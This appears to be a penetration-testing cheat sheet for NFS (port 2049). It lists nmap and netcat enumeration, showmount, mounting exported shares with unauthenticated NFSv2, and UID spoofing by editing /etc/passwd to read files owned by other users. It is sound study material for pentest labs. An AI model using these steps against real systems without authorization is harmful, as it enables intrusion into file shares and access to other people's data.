# Port 2049 - NFS

[https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

{% code overflow="wrap" %}
```bash
# Version info

NFSv2
It is older but is supported by many systems and was initially operated entirely over UDP.

NFSv3
It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.

NFSv4
It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.

```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Nmap
nmap -p 111 -sV --script=nfs-ls --script=nfs-showmount --script=nfs-statfs 10.11.1.72
nmap -p 111 --script nfs* 10.11.1.72 

# Banner
nc -nv 10.11.1.72 2049

# Enumerate NFS Shares
showmount -e 10.11.1.111

# If you find anything you can mount it like this:

mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock

# You should try version 2 first since there is no auth. 
mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock

mount 10.11.1.111:/ /tmp/NFS
mount -t 10.11.1.111:/ /tmp/NFS

# Add nfs version number if your encounter some error
sudo mount -t nfs -o nfsvers=3 10.11.1.72:/home /mnt/
sudo mount -t nfs -o nfsvers=3 192.168.142.203:/var/nfsshare /mnt/share
# -t: type
# -o: options

ls -al /mnt/share

# If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder. 

cd home/ && ls
sudo adduser pwn
sudo sed -i -e 's/1001/1014/g' /etc/passwd
cat /etc/passwd | grep pwn
su pwn
```
{% endcode %}
